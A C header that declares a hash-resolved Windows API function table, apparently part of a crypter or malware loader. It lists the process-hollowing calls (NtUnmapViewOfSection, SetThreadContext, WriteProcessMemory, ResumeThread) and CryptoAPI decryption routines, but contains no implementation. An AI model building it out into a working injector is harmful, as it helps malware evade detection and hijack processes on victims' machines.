#pragma once
#include <Windows.h>
#include <winternl.h>
#include <stdint.h>
#include "utils.h"
#include "syscall.h"

#define E_SUCCESS 0
#define E_ERROR -1

typedef struct _API
{
	DWORD	dwApiHash;
	LPVOID	*lpApiFuncPtr;
} API, *PAPI;

typedef struct _APIs
{
	BOOL(WINAPI *CreateProcess)(
		_In_opt_    LPCTSTR               lpApplicationName,
		_Inout_opt_ LPTSTR                lpCommandLine,
		_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_        BOOL                  bInheritHandles,
		_In_        DWORD                 dwCreationFlags,
		_In_opt_    LPVOID                lpEnvironment,
		_In_opt_    LPCTSTR               lpCurrentDirectory,
		_In_        LPSTARTUPINFO         lpStartupInfo,
		_Out_       LPPROCESS_INFORMATION lpProcessInformation
		);

	BOOL(WINAPI *GetThreadContext)(
		_In_    HANDLE    hThread,
		_Inout_ LPCONTEXT lpContext
		);

	BOOL(WINAPI *SetThreadContext)(
		_In_       HANDLE  hThread,
		_In_ const CONTEXT *lpContext
		);

	LPVOID(WINAPI *VirtualAlloc)(
		_In_opt_ LPVOID lpAddress,
		_In_     SIZE_T dwSize,
		_In_     DWORD  flAllocationType,
		_In_     DWORD  flProtect
		);

	LPVOID(WINAPI *VirtualAllocEx)(
		_In_     HANDLE hProcess,
		_In_opt_ LPVOID lpAddress,
		_In_     SIZE_T dwSize,
		_In_     DWORD  flAllocationType,
		_In_     DWORD  flProtect
		);

	BOOL(WINAPI *WriteProcessMemory)(
		_In_  HANDLE  hProcess,
		_In_  LPVOID  lpBaseAddress,
		_In_  LPCVOID lpBuffer,
		_In_  SIZE_T  nSize,
		_Out_ SIZE_T  *lpNumberOfBytesWritten
		);

	DWORD(WINAPI *ResumeThread)(
		_In_ HANDLE hThread
		);

	BOOL(WINAPI *TerminateProcess)(
		_In_ HANDLE hProcess,
		_In_ UINT   uExitCode
		);

	VOID(WINAPI *ExitProcess)(
		_In_ UINT uExitCode
		);

	BOOL(WINAPI *ReadProcessMemory)(
		_In_  HANDLE  hProcess,
		_In_  LPCVOID lpBaseAddress,
		_Out_ LPVOID  lpBuffer,
		_In_  SIZE_T  nSize,
		_Out_ SIZE_T  *lpNumberOfBytesRead
	);

	DWORD(WINAPI *GetModuleFileName)(
		_In_opt_ HMODULE hModule,
		_Out_    LPTSTR  lpFilename,
		_In_     DWORD   nSize
	);

	LPTSTR(WINAPI *GetCommandLine)(void);

	NTSTATUS(NTAPI *NtUnmapViewOfSection)(
		_In_     HANDLE ProcessHandle,
		_In_opt_ PVOID  BaseAddress
	);

	BOOL(WINAPI *CloseHandle)(
		_In_ HANDLE hObject
	);

	BOOL(WINAPI *IsWow64Process)(
		_In_  HANDLE hProcess,
		_Out_ PBOOL  Wow64Process
	);

	HANDLE(WINAPI *CreateFile)(
		_In_     LPCTSTR               lpFileName,
		_In_     DWORD                 dwDesiredAccess,
		_In_     DWORD                 dwShareMode,
		_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		_In_     DWORD                 dwCreationDisposition,
		_In_     DWORD                 dwFlagsAndAttributes,
		_In_opt_ HANDLE                hTemplateFile
	);

	BOOL(WINAPI *ReadFile)(
		_In_        HANDLE       hFile,
		_Out_       LPVOID       lpBuffer,
		_In_        DWORD        nNumberOfBytesToRead,
		_Out_opt_   LPDWORD      lpNumberOfBytesRead,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
	);

	DWORD(WINAPI *GetFileSize)(
		_In_      HANDLE  hFile,
		_Out_opt_ LPDWORD lpFileSizeHigh
	);

	BOOL(WINAPI *VirtualFree)(
		_In_ LPVOID lpAddress,
		_In_ SIZE_T dwSize,
		_In_ DWORD  dwFreeType
	);

	HMODULE(WINAPI *LoadLibraryA)(
		_In_ LPCSTR lpFileName
	);

	HMODULE(WINAPI *LoadLibraryW)(
		_In_ LPCWSTR lpFileName
		);

	BOOL(WINAPI *CryptAcquireContext)(
		_Out_ HCRYPTPROV *phProv,
		_In_  LPCTSTR    pszContainer,
		_In_  LPCTSTR    pszProvider,
		_In_  DWORD      dwProvType,
		_In_  DWORD      dwFlags
	);

	BOOL(WINAPI *CryptCreateHash)(
		_In_  HCRYPTPROV hProv,
		_In_  ALG_ID     Algid,
		_In_  HCRYPTKEY  hKey,
		_In_  DWORD      dwFlags,
		_Out_ HCRYPTHASH *phHash
	);

	BOOL(WINAPI *CryptHashData)(
		_In_ HCRYPTHASH hHash,
		_In_ BYTE       *pbData,
		_In_ DWORD      dwDataLen,
		_In_ DWORD      dwFlags
	);

	BOOL(WINAPI *CryptDeriveKey)(
		_In_    HCRYPTPROV hProv,
		_In_    ALG_ID     Algid,
		_In_    HCRYPTHASH hBaseData,
		_In_    DWORD      dwFlags,
		_Inout_ HCRYPTKEY  *phKey
	);

	BOOL(WINAPI *CryptDestroyHash)(
		_In_ HCRYPTHASH hHash
	);

	BOOL(WINAPI *CryptDecrypt)(
		_In_    HCRYPTKEY  hKey,
		_In_    HCRYPTHASH hHash,
		_In_    BOOL       Final,
		_In_    DWORD      dwFlags,
		_Inout_ BYTE       *pbData,
		_Inout_ DWORD      *pdwDataLen
	);

	BOOL(WINAPI *CryptDestroyKey)(
		_In_ HCRYPTKEY hKey
	);

	BOOL(WINAPI *CryptReleaseContext)(
		_In_ HCRYPTPROV hProv,
		_In_ DWORD      dwFlags
	);

	HMODULE(WINAPI *GetModuleHandle)(
		_In_opt_ LPCTSTR lpModuleName
	);

	FARPROC(WINAPI *GetProcAddress)(
		_In_ HMODULE hModule,
		_In_ LPCSTR  lpProcName
	);

	DWORD(WINAPI *WaitForSingleObject)(
			__in HANDLE hHandle,
			__in DWORD dwMilliseconds
	);

	HANDLE(WINAPI *CreateThread)(
			__in_opt  LPSECURITY_ATTRIBUTES lpThreadAttributes,
			__in      SIZE_T dwStackSize,
			__in      LPTHREAD_START_ROUTINE lpStartAddress,
			__in_opt __deref __drv_aliasesMem LPVOID lpParameter,
			__in      DWORD dwCreationFlags,
			__out_opt LPDWORD lpThreadId
	);

	VOID(WINAPI *ExitThread)(
			__in DWORD dwExitCode
	);

} APIs, *PAPIs;

APIs	load_api(void);